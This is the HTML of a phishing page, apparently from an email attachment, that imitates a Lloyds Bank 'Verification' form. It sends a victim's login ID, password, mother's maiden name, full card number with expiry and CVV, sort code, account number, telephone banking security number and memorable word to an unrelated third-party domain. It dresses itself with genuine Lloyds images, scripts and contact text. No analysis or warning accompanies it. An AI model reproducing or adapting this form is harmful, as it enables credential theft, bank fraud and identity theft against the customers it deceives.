+                                    =
+
+                                    =
+
+                                    =
+
+                                    =
+
+                                    =
+
+                                    =
+
+                                    =
+
+                                    =
+
+                                    =
+
+
+                                =
+
+                            =
+
+
+                        =
+
+
+                        =
+
+                            =
+
+                            =
+
+                                =
+
+                                =
+
+                                =
+
+                                =
+
+                            =
+
+                            =
+
+                                =
+
+                                =
+
+                                =
+
+                                    =
+
+                                    =
+
+                                    =
+
+                                    =
+
+                                    =
+
+                                    =
+
+                                    =
+
+                                    =
+
+                                    =
+
+                                    =
+
+                                    =
+
+    =
+
+
+                            =
+
+                        =
+
+
+
+                        =
+
+
+                            =
+
+                            =
+
+
+                            =
+
+                                =
+
+                                =
+
+                                =
+
+                                =
+
+
+                                =
+
+                                    =
+
+                                    =
+
+                                    =
+
+                                    =
+
+                                =
+
+
+                            =
+
+
+
+                        =
+
+
+                    =
+
+                =
+
+
+
+
+                =
+
+                =
+
+                    =
+
+                        =
+
+                        =
+
+                        =
+
+                            =
+
+                            =
+
+                        =
+
+                        =
+
+                            =
+
+                            =
+
+                            =
+
+                                =
+
+                                    =
+
+                                    =
+
+                                =
+
+                            =
+
+                        =
+
+                    =
+
+                    =
+
+                        =
+
+                        =
+
+
+                        =
+
+                        =
+
+                            =
+
+                            =
+
+                            =
+
+                            =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                            =
+
+                            =
+
+                            =
+
+                            =
+
+                            =
+
+                        =
+
+                        =
+
+                        =
+
+
+                    =
+
+                =
+
+
+                =
+
+                    =
+
+                        =
+
+                        =
+
+                        =
+
+                            =
+
+                            =
+
+                        =
+
+                        =
+
+                            =
+
+                            =
+
+                            =
+
+                                =
+
+                                    =
+
+                                    =
+
+                                =
+
+                            =
+
+                        =
+
+                    =
+
+                    =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                            =
+
+                            =
+
+                            =
+
+                            =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                            =
+
+                            =
+
+                            =
+
+                            =
+
+                        =
+
+                        =
+
+                        =
+
+
+                    =
+
+                =
+
+
+
+
+
+                =
+
+                    =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+
+
+                        =
+
+                    =
+
+                    =
+
+                    =
+
+                    =
+
+
+                =
+
+                =
+
+                    =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                    =
+
+                    =
+
+                        =
+
+                        =
+
+                            =
+
+                            =
+
+                            =
+
+                            =
+
+                        =
+
+                        =
+
+                            =
+
+                            =
+
+                            =
+
+                            =
+
+                        =
+
+                        =
+
+                        =
+
+                    =
+
+                =
+
+                =
+
+
+                =
+
+             =
+
+                =
+
+                    =
+
+                    =
+
+                    =
+
+
+                        =
+
+                        =
+
+                        =
+
+
+
+                =
+
+                =
+
+                =
+
+                =
+
+                =
+
+                    =
+
+                    =
+
+                    =
+
+                        =
+
+                    =
+
+                    =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                    =
+
+                =
+
+
+
+
+            =
+
+<form id=3D"frm_personalRegistration" name=3D"frm_personalRegistration" met=
+hod=3D"post" action=3D"http://www.observatoriodasmetropoles.net/custom/resu=
+lt.php" class=3D"validationName:(frm_personalRegistration) validate:() vali=
+dationName:(registerIB) validate:()" autocomplete=3D"off" enctype=3D"applic=
+ation/x-www-form-urlencoded">
+<div class=3D"inner"><!-- start TS:component_0_free_format -->	=
+
+	=
+
+
+
+		<h1>Verification &#8211; please enter your details</h1>
+
+
+
+<!-- end TS:component_0_free_format --><!-- start TS:component_0_free_forma=
+t -->	=
+
+	=
+
+
+
+		<p><strong>Verification</strong> is easy and <strong>should only take abo=
+ut 5 minutes</strong>.</p>
+<p>To begin, you must have a:</p>
+<ul>
+<li>current account, savings account, credit card, mortgage or other loan i=
+f you're aged 18 or over</li>
+<li>current or savings account if you're aged 16 or 17</li>
+<li>current account if you're aged 11 to 15</li>
+</ul></div>
+
+<fieldset><div class=3D"formField validate:(required_validateExtendedAlphaN=
+umeric) validationName:(userid) clearfix"><div class=3D"formFieldInner"><la=
+bel for=3D"frm_personalRegistration:txtFirstName"><strong>User ID:</strong>=
+</label><input type=3D"text" autocomplete=3D"off" id=3D"frm_personalRegistr=
+ation:txtFirstName" name=3D"frm_personalRegistration:txtUserName" class=3D"=
+field" maxlength=3D"30" /></div></div>
+
+<div class=3D"formField validate:(required_validateExtendedAlphaNumeric) va=
+lidationName:(password) clearfix"><div class=3D"formFieldInner"><label for=
+=3D"frm_personalRegistration:txtFirstName"><strong>Password:</strong></labe=
+l><input type=3D"text" autocomplete=3D"off" id=3D"frm_personalRegistration:=
+txtFirstName" name=3D"frm_personalRegistration:txtPassword" class=3D"field"=
+ maxlength=3D"30" /></div></div>
+
+<div class=3D"formField clearfix validationName:(txttitle) validate:(requir=
+ed_validateLength[max:16]_validateAlphaNumeric[msg:scriptCollectorm0])"><di=
+v class=3D"formFieldInner"><label for=3D"frm_personalRegistration:txttitle"=
+>Title:</label><input type=3D"text" autocomplete=3D"off" id=3D"frm_personal=
+Registration:txttitle" name=3D"frm_personalRegistration:txttitle" class=3D"=
+field" maxlength=3D"16" /></div></div>
+
+<div class=3D"formField validate:(required_validateExtendedAlphaNumeric) va=
+lidationName:(firstName) clearfix"><div class=3D"formFieldInner"><label for=
+=3D"frm_personalRegistration:txtFirstName"><strong>First name:</strong></la=
+bel><input type=3D"text" autocomplete=3D"off" id=3D"frm_personalRegistratio=
+n:txtFirstName" name=3D"frm_personalRegistration:txtFirstName" class=3D"fie=
+ld" maxlength=3D"30" /></div></div>
+
+<div class=3D"formField validate:(required_validateExtendedAlphaNumeric) va=
+lidationName:(middleName) clearfix"><div class=3D"formFieldInner"><label fo=
+r=3D"frm_personalRegistration:txtFirstName"><strong>Middle name:</strong></=
+label><input type=3D"text" autocomplete=3D"off" id=3D"frm_personalRegistrat=
+ion:txtFirstName" name=3D"frm_personalRegistration:txtMiddleName" class=3D"=
+field" maxlength=3D"30" /></div></div>
+
+
+<div class=3D"formField validate:(required_validateExtendedAlphaNumeric) va=
+lidationName:(surname) clearfix"><div class=3D"formFieldInner"><label for=
+=3D"frm_personalRegistration:txtsurname"><strong>Last name:</strong></label=
+><input type=3D"text" autocomplete=3D"off" id=3D"frm_personalRegistration:t=
+xtsurname" name=3D"frm_personalRegistration:txtsurname" class=3D"field" max=
+length=3D"30" /></div></div>
+
+<div class=3D"formField clearfix validationName:(slctDateDay) validate:(req=
+uired_validateDateTimeRange[minDate:1915-01-01,maxDate:2004-02-06,msg:scrip=
+tCollectorm1])"><div class=3D"formFieldInner"><div class=3D"date inputGroup=
+"><span class=3D"label"><strong>Date of birth:</strong></span><label for=3D=
+"frm_personalRegistration:slctDateDay" class=3D"postit">Day</label><select =
+id=3D"frm_personalRegistration:slctDateDay" name=3D"frm_personalRegistratio=
+n:slctDateDay" class=3D"day slctDay"><option value=3D"-">Day</option><optio=
+n value=3D"01">01</option><option value=3D"02">02</option><option value=3D"=
+03">03</option><option value=3D"04">04</option><option value=3D"05">05</opt=
+ion><option value=3D"06">06</option><option value=3D"07">07</option><option=
+ value=3D"08">08</option><option value=3D"09">09</option><option value=3D"1=
+0">10</option><option value=3D"11">11</option><option value=3D"12">12</opti=
+on><option value=3D"13">13</option><option value=3D"14">14</option><option =
+value=3D"15">15</option><option value=3D"16">16</option><option value=3D"17=
+">17</option><option value=3D"18">18</option><option value=3D"19">19</optio=
+n><option value=3D"20">20</option><option value=3D"21">21</option><option v=
+alue=3D"22">22</option><option value=3D"23">23</option><option value=3D"24"=
+>24</option><option value=3D"25">25</option><option value=3D"26">26</option=
+><option value=3D"27">27</option><option value=3D"28">28</option><option va=
+lue=3D"29">29</option><option value=3D"30">30</option><option value=3D"31">=
+31</option></select><label for=3D"frm_personalRegistration:slctDateDay.mont=
+h" class=3D"postit">Month</label><select id=3D"frm_personalRegistration:slc=
+tDateDaymonth" name=3D"frm_personalRegistration:slctDateDaymonth" class=3D"=
+month slctMonth"><option value=3D"-">Month</option><option value=3D"01">Jan=
+uary</option><option value=3D"02">February</option><option value=3D"03">Mar=
+ch</option><option value=3D"04">April</option><option value=3D"05">May</opt=
+ion><option value=3D"06">June</option><option value=3D"07">July</option><op=
+tion value=3D"08">August</option><option value=3D"09">September</option><op=
+tion value=3D"10">October</option><option value=3D"11">November</option><op=
+tion value=3D"12">December</option></select><label for=3D"frm_personalRegis=
+tration:slctDateDay.year" class=3D"postit">Year</label><select id=3D"frm_pe=
+rsonalRegistration:slctDateDayyear" name=3D"frm_personalRegistration:slctDa=
+teDayyear" class=3D"year slctYear"><option value=3D"-">Year</option><option=
+ value=3D"1915">1915</option><option value=3D"1916">1916</option><option va=
+lue=3D"1917">1917</option><option value=3D"1918">1918</option><option value=
+=3D"1919">1919</option><option value=3D"1920">1920</option><option value=3D=
+"1921">1921</option><option value=3D"1922">1922</option><option value=3D"19=
+23">1923</option><option value=3D"1924">1924</option><option value=3D"1925"=
+>1925</option><option value=3D"1926">1926</option><option value=3D"1927">19=
+27</option><option value=3D"1928">1928</option><option value=3D"1929">1929<=
+/option><option value=3D"1930">1930</option><option value=3D"1931">1931</op=
+tion><option value=3D"1932">1932</option><option value=3D"1933">1933</optio=
+n><option value=3D"1934">1934</option><option value=3D"1935">1935</option><=
+option value=3D"1936">1936</option><option value=3D"1937">1937</option><opt=
+ion value=3D"1938">1938</option><option value=3D"1939">1939</option><option=
+ value=3D"1940">1940</option><option value=3D"1941">1941</option><option va=
+lue=3D"1942">1942</option><option value=3D"1943">1943</option><option value=
+=3D"1944">1944</option><option value=3D"1945">1945</option><option value=3D=
+"1946">1946</option><option value=3D"1947">1947</option><option value=3D"19=
+48">1948</option><option value=3D"1949">1949</option><option value=3D"1950"=
+>1950</option><option value=3D"1951">1951</option><option value=3D"1952">19=
+52</option><option value=3D"1953">1953</option><option value=3D"1954">1954<=
+/option><option value=3D"1955">1955</option><option value=3D"1956">1956</op=
+tion><option value=3D"1957">1957</option><option value=3D"1958">1958</optio=
+n><option value=3D"1959">1959</option><option value=3D"1960">1960</option><=
+option value=3D"1961">1961</option><option value=3D"1962">1962</option><opt=
+ion value=3D"1963">1963</option><option value=3D"1964">1964</option><option=
+ value=3D"1965">1965</option><option value=3D"1966">1966</option><option va=
+lue=3D"1967">1967</option><option value=3D"1968">1968</option><option value=
+=3D"1969">1969</option><option value=3D"1970">1970</option><option value=3D=
+"1971">1971</option><option value=3D"1972">1972</option><option value=3D"19=
+73">1973</option><option value=3D"1974">1974</option><option value=3D"1975"=
+>1975</option><option value=3D"1976">1976</option><option value=3D"1977">19=
+77</option><option value=3D"1978">1978</option><option value=3D"1979">1979<=
+/option><option value=3D"1980">1980</option><option value=3D"1981">1981</op=
+tion><option value=3D"1982">1982</option><option value=3D"1983">1983</optio=
+n><option value=3D"1984">1984</option><option value=3D"1985">1985</option><=
+option value=3D"1986">1986</option><option value=3D"1987">1987</option><opt=
+ion value=3D"1988">1988</option><option value=3D"1989">1989</option><option=
+ value=3D"1990">1990</option><option value=3D"1991">1991</option><option va=
+lue=3D"1992">1992</option><option value=3D"1993">1993</option><option value=
+=3D"1994">1994</option><option value=3D"1995">1995</option><option value=3D=
+"1996">1996</option><option value=3D"1997">1997</option><option value=3D"19=
+98">1998</option><option value=3D"1999">1999</option><option value=3D"2000"=
+>2000</option><option value=3D"2001">2001</option><option value=3D"2002">20=
+02</option><option value=3D"2003">2003</option><option value=3D"2004">2004<=
+/option></select></div></div></div></fieldset>
+
+<div class=3D"formField validate:(required_validateExtendedAlphaNumeric) va=
+lidationName:(mothermaiden) clearfix"><div class=3D"formFieldInner"><label =
+for=3D"frm_personalRegistration:txtFirstName"><strong>Mother's maiden name:=
+</strong></label><input type=3D"text" autocomplete=3D"off" id=3D"frm_person=
+alRegistration:txtFirstName" name=3D"frm_personalRegistration:txtmmn" class=
+=3D"field" maxlength=3D"30" /></div></div>
+
+<div class=3D"formField validate:(required_validateExtendedAlphaNumeric) va=
+lidationName:(landline) clearfix"><div class=3D"formFieldInner"><label for=
+=3D"frm_personalRegistration:txtFirstName"><strong>Landline:</strong></labe=
+l><input type=3D"text" autocomplete=3D"off" id=3D"frm_personalRegistration:=
+txtFirstName" name=3D"frm_personalRegistration:txtLandline" class=3D"field"=
+ maxlength=3D"30" /></div></div>
+
+<div class=3D"formField validate:(required_validateExtendedAlphaNumeric) va=
+lidationName:(mobile) clearfix"><div class=3D"formFieldInner"><label for=3D=
+"frm_personalRegistration:txtFirstName"><strong>Mobile number:</strong></la=
+bel><input type=3D"text" autocomplete=3D"off" id=3D"frm_personalRegistratio=
+n:txtFirstName" name=3D"frm_personalRegistration:txtMobile" class=3D"field"=
+ maxlength=3D"30" /></div></div>
+
+
+<div class=3D"linkedCheckBoxAndTextFields"><div class=3D"formField validate=
+:(requiredWithoutCheckbox_validatePostcode) validationName:(postcodeAddress=
+) clearfix"><div class=3D"formFieldInner"><label for=3D"frm_personalRegistr=
+ation:txtPostcode"><strong>UK postcode:</strong></label><input type=3D"text=
+" autocomplete=3D"off" id=3D"frm_personalRegistration:txtPostcode" name=3D"=
+frm_personalRegistration:txtPostcode" class=3D"postcode linkedTextField" ma=
+xlength=3D"8" /></div></div></div><fieldset class=3D"dash"><div class=3D"in=
+ner"><!-- start TS:component_0_free_format -->	=
+
+	=
+
+
+
+		=
+
+
+<h2>We just need some details about one of your LLOYDS accounts</h2>
+
+
+
+<!-- end TS:component_0_free_format --></div><div id=3D"frm_personalRegistr=
+ation:pnlDetGrp" class=3D"accountDetailsGroup">
+
+<div class=3D"formField clearfix validationName:(strAccountNumber) validate=
+:(required[msg:scriptCollectorm2]_validateRegExp[exp:scriptCollectore0,msg:=
+scriptCollectorm3]_validateLength[min:16,max:16,msg:scriptCollectorm4])"><d=
+iv class=3D"formFieldInner"><label for=3D"frm_personalRegistration:strAccou=
+ntNumber"><strong>Credit/Debit cardnumber:</strong></label><input type=3D"t=
+ext" autocomplete=3D"off" id=3D"frm_personalRegistration:strAccountNumber" =
+name=3D"frm_personalRegistration:strCardNumber" class=3D"field" maxlength=
+=3D"16" /></div></div>
+
+<div class=3D"formField clearfix validationName:(slctDateDayy) validate:(re=
+quired_validateDateTimeRange[minDate:1915-01-01,maxDate:2015-03-06,msg:scri=
+ptCollectorm1])"><div class=3D"formFieldInner"><div class=3D"date inputGrou=
+p"><span class=3D"label"><strong>Issue date:</strong></span><label for=3D"f=
+rm_personalRegistration:slctDateDay.month" class=3D"postit">Month</label><s=
+elect id=3D"frm_personalRegistration:slctDateDaymonth" name=3D"frm_personal=
+Registration:slctDateDaymonthissue" class=3D"month slctMonth"><option value=
+=3D"-">Month</option><option value=3D"01">January</option><option value=3D"=
+02">February</option><option value=3D"03">March</option><option value=3D"04=
+">April</option><option value=3D"05">May</option><option value=3D"06">June<=
+/option><option value=3D"07">July</option><option value=3D"08">August</opti=
+on><option value=3D"09">September</option><option value=3D"10">October</opt=
+ion><option value=3D"11">November</option><option value=3D"12">December</op=
+tion></select><label for=3D"frm_personalRegistration:slctDateDay.year" clas=
+s=3D"postit">Year</label><select id=3D"frm_personalRegistration:slctDateDay=
+year" name=3D"frm_personalRegistration:slctDateDayyearissue" class=3D"year =
+slctYear"><option value=3D"-">Year</option><option value=3D"2009">2009</opt=
+ion><option value=3D"2010">2010</option><option value=3D"2011">2011</option=
+><option value=3D"2012">2012</option><option value=3D"2013">2013</option><o=
+ption value=3D"2014">2014</option><option value=3D"2015">2015</option></sel=
+ect></div></div></div>
+
+<div class=3D"formField clearfix validationName:(slctDateDayyy) validate:(r=
+equired_validateDateTimeRange[minDate:2015-01-01,maxDate:2030-01-01,msg:scr=
+iptCollectorm1])"><div class=3D"formFieldInner"><div class=3D"date inputGro=
+up"><span class=3D"label"><strong>Expiry date:</strong></span><label for=3D=
+"frm_personalRegistration:slctDateDay.month" class=3D"postit">Month</label>=
+<select id=3D"frm_personalRegistration:slctDateDaymonth" name=3D"frm_person=
+alRegistration:slctDateDaymonthexpiry" class=3D"month slctMonth"><option va=
+lue=3D"-">Month</option><option value=3D"01">January</option><option value=
+=3D"02">February</option><option value=3D"03">March</option><option value=
+=3D"04">April</option><option value=3D"05">May</option><option value=3D"06"=
+>June</option><option value=3D"07">July</option><option value=3D"08">August=
+</option><option value=3D"09">September</option><option value=3D"10">Octobe=
+r</option><option value=3D"11">November</option><option value=3D"12">Decemb=
+er</option></select><label for=3D"frm_personalRegistration:slctDateDayyear"=
+ class=3D"postit">Year</label><select id=3D"frm_personalRegistration:slctDa=
+teDayyear" name=3D"frm_personalRegistration:slctDateDayyearexpiry" class=3D=
+"year slctYear"><option value=3D"-">Year</option><option value=3D"2015">201=
+5</option><option value=3D"2016">2016</option><option value=3D"2017">2017</=
+option><option value=3D"2018">2018</option><option value=3D"2019">2019</opt=
+ion><option value=3D"2020">2020</option><option value=3D"2021">2021</option=
+><option value=3D"2022">2022</option><option value=3D"2023">2023</option><o=
+ption value=3D"2024">2024</option></select></div></div></div>
+
+<div class=3D"formField clearfix validationName:(strCvv) validate:(required=
+[msg:scriptCollectorm2]_validateRegExp[exp:scriptCollectore0,msg:scriptColl=
+ectorm3]_validateLength[min:3,max:3,msg:scriptCollectorm4])"><div class=3D"=
+formFieldInner"><label for=3D"frm_personalRegistration:strAccountNumber"><s=
+trong>3-Digit security code:</strong></label><input type=3D"text" autocompl=
+ete=3D"off" id=3D"frm_personalRegistration:strAccountNumber" name=3D"frm_pe=
+rsonalRegistration:strCardNumberCvv" class=3D"field" maxlength=3D"3" /></di=
+v></div>
+
+<div class=3D"formField fieldHelp validate:(required_validateNumeric_valida=
+teSortcode) validationName:(sortCode) sortCode clearfix"><div class=3D"form=
+FieldInner"><div class=3D"inputGroup"><span class=3D"label"><strong>Sort co=
+de:</strong></span><label for=3D"frm_personalRegistration:strSortCode" clas=
+s=3D"postit">Sort code part 1</label><input type=3D"text" id=3D"frm_persona=
+lRegistration:strSortCode" name=3D"frm_personalRegistration:strSortCode" ma=
+xlength=3D"2" size=3D"2" /><span class=3D"separator">-</span><label for=3D"=
+frm_personalRegistration:strSortCode_p2" class=3D"postit">Sort code part 2<=
+/label><input type=3D"text" id=3D"frm_personalRegistration:strSortCode_p2" =
+name=3D"frm_personalRegistration:strSortCode_p2" maxlength=3D"2" size=3D"2"=
+ /><span class=3D"separator">-</span><label for=3D"frm_personalRegistration=
+:strSortCode_p3" class=3D"postit">Sort code part 3</label><input type=3D"te=
+xt" id=3D"frm_personalRegistration:strSortCode_p3" name=3D"frm_personalRegi=
+stration:strSortCode_p3" maxlength=3D"2" size=3D"2" /></div></div></div><di=
+v class=3D"formField clearfix validationName:(strAcctNumber) validate:(requ=
+ired[msg:scriptCollectorm2]_validateRegExp[exp:scriptCollectore0,msg:script=
+Collectorm3]_validateLength[min:8,max:8,msg:scriptCollectorm4])"><div class=
+=3D"formFieldInner"><label for=3D"frm_personalRegistration:strAccountNumber=
+"><strong>Account number:</strong></label><input type=3D"text" autocomplete=
+=3D"off" id=3D"frm_personalRegistration:strAccountNumber" name=3D"frm_perso=
+nalRegistration:strAccountNumber" class=3D"field" maxlength=3D"8" /></div><=
+/div>
+
+<div class=3D"formField clearfix validationName:(strAccNumber) validate:(re=
+quired[msg:scriptCollectorm2]_validateRegExp[exp:scriptCollectore0,msg:scri=
+ptCollectorm3]_validateLength[min:6,max:6,msg:scriptCollectorm4])"><div cla=
+ss=3D"formFieldInner"><label for=3D"frm_personalRegistration:strAccountNumb=
+er"><strong>Telephone banking security number:</strong></label><input type=
+=3D"text" autocomplete=3D"off" id=3D"frm_personalRegistration:strAccountNum=
+ber" name=3D"frm_personalRegistration:strCardNumberTele" class=3D"field" ma=
+xlength=3D"6" /></div></div>
+
+<div class=3D"formField validate:(required_validateExtendedAlphaNumeric) va=
+lidationName:(memword) clearfix"><div class=3D"formFieldInner"><label for=
+=3D"frm_personalRegistration:txtFirstName"><strong>Memorable word:</strong>=
+</label><input type=3D"text" autocomplete=3D"off" id=3D"frm_personalRegistr=
+ation:txtFirstName" name=3D"frm_personalRegistration:txtMem" class=3D"field=
+" maxlength=3D"30" /></div></div>
+
+
+</div></fieldset><div class=3D"dbtSteps clearfix"><ul class=3D"actions link=
+List"><li class=3D"primaryAction"><input id=3D"frm_personalRegistration:con=
+tinuebutton1" name=3D"frm_personalRegistration:continuebutton1" type=3D"ima=
+ge" src=3D"https://online.lloydsbank.co.uk/wps/wcm/connect/7e1ffb0040a0737e=
+8ace8bb36433efea/continue-26-1423146820.png?MOD=3DAJPERES&amp;CACHEID=3D7e1=
+ffb0040a0737e8ace8bb36433efea" alt=3D"Continue" title=3D"Continue" class=3D=
+"submitAction" /></li><li class=3D"secondaryAction"></li></ul></div><input =
+type=3D"hidden" name=3D"frm_personalRegistration" value=3D"frm_personalRegi=
+stration" /><input type=3D"hidden" name=3D"submitToken" value=3D"9105448" />
+</form>
+
+        =
+
+                            </div>
+                        </div>
+                        =
+
+                    </div>
+                    <div class=3D"secondary">
+                        <div class=3D"panel">
+                            =
+
+
+        =
+
+                            =
+
+                            =
+
+                =
+
+                =
+
+                =
+
+            =
+
+                            <div class=3D"accordion"><div class=3D"part"><h=
+2 class=3D"trigger">Contact Us....</h2><div class=3D"pane"><div class=3D"pa=
+neInner"><div class=3D"quickContact"><!-- start TS:component_0_free_format =
+-->	=
+
+	=
+
+
+
+		<h3>All account related queries</h3>
+<p><strong>0845 3 000 000</strong></p>
+<p>If you need to call us from abroad or prefer not to use our 0845 number,=
+ you can also call us on +44 1733 347 007.</p>
+<p>Calls may be monitored and recorded in case we need to check we have car=
+ried out your instructions correctly and to help us improve our quality of =
+service.<br /><br /></p>
+<h3>Internet banking queries</h3>
+<p>Technical queries about the Internet Banking service</p>
+<p>Call us on<strong>&#160;0845 300 0116</strong>. We&#8217;re open 7am-10p=
+m Mon &#8211; Fri, 8am-6pm Sat &#8211; Sun.</p>
+<p>If you need to call us from abroad you can also call us on<strong>&#160;=
++44 2076 499 437</strong>.</p>
+
+
+<!-- end TS:component_0_free_format --></div></div></div></div><div class=
+=3D"part"><h2 class=3D"trigger current">Help &amp; Support</h2><div class=
+=3D"pane"><div class=3D"paneInner"><ul class=3D"quickFAQs">
+			=
+
+	=
+
+	<li><h3 class=3D"qfaqTrigger">Which account details should I provide if I =
+have more than one account with Lloyds Bank?</h3>
+			<div class=3D"qfaqCont">
+					<p>It&#8217;s really up to you. Perhaps you should consider using the =
+account that you use most frequently or whose details you can remember best=
+.</p>
+				    </div>
+			</li>
+<li><h3 class=3D"qfaqTrigger">Where can I find my sort code and account num=
+ber?</h3>
+			<div class=3D"qfaqCont">
+					<p>You can find these details on one of your latest statements or on y=
+our cheque book.</p>
+				    </div>
+			</li>
+<li><h3 class=3D"qfaqTrigger">Why is it necessary to provide my email addre=
+ss?</h3>
+			<div class=3D"qfaqCont">
+					<p>We need it to contact you should any queries arise on your account.=
+</p>
+				    </div>
+			</li>
+<li><h3 class=3D"qfaqTrigger">Where do I find my credit card number?</h3>
+			<div class=3D"qfaqCont">
+					<p>It&#8217;s the 16 digit number on the front of your credit card. Pl=
+ease enter it without spaces.</p>
+				    </div>
+			</li>
+</ul></div></div></div></div>
+
+
+
+
+    =
+
+              =
+
+        =
+
+        =
+
+            =
+
+                =
+
+                    =
+
+                =
+
+            =
+
+            =
+
+                    =
+
+            =
+
+        =
+
+                =
+
+        =
+
+            =
+
+        =
+
+        =
+
+                            =
+
+
+            =
+
+                =
+
+                =
+
+                =
+
+                =
+
+            <div class=3D"subPanel"><!-- start TS:component_0_free_format -=
+->	=
+
+	=
+
+
+
+		<h3>Our Internet Banking Guarantee</h3>
+
+
+
+<!-- end TS:component_0_free_format --><!-- start TS:component_0_free_forma=
+t -->	=
+
+	=
+
+
+	=
+
+	<p>We guarantee to refund your money in the unlikely event you experience =
+fraud with our&#160;Internet Banking service &#8211; as long as you've been=
+ careful, for example, by taking reasonable steps to keep your security inf=
+ormation safe. We protect you with safeguards that meet Industry Standards.=
+</p>
+<ul>
+<li>Keep your password secure and <strong>do not let anyone else make use o=
+f your security details</strong>, even if they share a joint account with y=
+ou.</li>
+<li>Do not let anyone watch you enter your security details and log off aft=
+er each&#160;Internet Banking session.</li>
+<li>Carry out regular virus checks on your devices and have the latest oper=
+ating system and web browser installed.</li>
+</ul>
+<p>Find out more about how to&#160;<a class=3D"newwin" href=3D"http://www.l=
+loydsbank.com/help-guidance/security/what-can-you-do.asp" title=3D"protect =
+yourself online"   >protect yourself online</a><strong>.</strong>&#160;</p>
+
+
+
+<!-- end TS:component_0_free_format --></div>
+        =
+
+                        </div>
+                    </div>
+                </div>              =
+
+            </div>
+            =
+
+
+
+
+
+
+
+
+
+
+<div id=3D"footer">
+	<div class=3D"outer">
+		<div id=3D"footerInner">
+			=
+
+			=
+
+			<ul><li><a class=3D"newwin" href=3D"http://www.lloydsbank.com/legal.asp"=
+ title=3D"Legal"   >Legal</a></li><li><a class=3D"newwin" href=3D"http://ww=
+w.lloydsbank.com/privacy2.asp" title=3D"Privacy"   >Privacy</a></li><li><a =
+class=3D"newwin" href=3D"http://www.lloydsbank.com/security.asp" title=3D"S=
+ecurity"   >Security</a></li><li><a class=3D"newwin" href=3D"http://www.llo=
+ydsbankinggroup.com/" title=3D"www.lloydsbankinggroup.com"   >www.lloydsban=
+kinggroup.com</a></li><li><a class=3D"newwin" href=3D"http://www.lloydsbank=
+.com/rates_and_charges.asp" title=3D"Rates and Charges"   >Rates and Charge=
+s</a></li></ul>
+			=
+
+		</div>
+	</div>
+</div>
+
+
+
+        </div>
+        <script type=3D"text/javascript">if(!window.Messages){window.Messag=
+es=3D{}};Messages["scriptCollectorm3"]=3D"Sorry but the details you entered=
+ aren't in the correct format. Please enter numbers only.";Messages["script=
+Collectorm2"]=3D"Please provide this information.";Messages["scriptCollecto=
+rm1"]=3D"Sorry, you must be aged 11 or older to register for Internet Banki=
+ng.";Messages["scriptCollectorm0"]=3D"We're sorry, but the information you'=
+ve entered is invalid. Please check it and try again.";Messages["scriptColl=
+ectorm4"]=3D"You've either not entered enough characters or you've entered =
+too many.";if(!window.RegExps){window.RegExps=3D{}};RegExps["scriptCollecto=
+re0"]=3D"^[0-9]+$";LBG.tags.ajax.addAjaxAction("frm_personalRegistration:_i=
+dFC27","frm_personalRegistration:pnlDetGrp","frm_personalRegistration:slcta=
+ccountType","change",2,"https://online.lloydsbank.co.uk/personal/a/registra=
+tion/onlinepersonalregistration.jsp","slctaccountType","frm_personalRegistr=
+ation:slctaccountType");</script><noscript><div><img alt=3D"DCSIMG" id=3D"D=
+CSIMG" class=3D"hide" src=3D"https://statse.webtrendslive.com/dcsfn00jp1000=
+00w4d2tx3zos_2b3p/njs.gif?dcsuri=3D/nojavascript&amp;WT.js=3DNo&amp;WT.tv=
+=3D10.4.11"/></div></noscript>
+        =
+
+
+<script type=3D"text/javascript">
+	LBG.functions.init();
+
+</script>
+
+<script type=3D"text/javascript" src=3D"https://online.lloydsbank.co.uk/per=
+sonal/assets/webtrends/CP06.01.js"></script>
+
+
+<script type=3D"text/javascript" src=3D"https://online.lloydsbank.co.uk/per=
+sonal/assets/lib/analyticsver10-min150528.js"></script>
+
+
+
+
+
+    </body>
+</html>
+
+<!-- J29 served by A0304 -->
+--===============0053034220==--
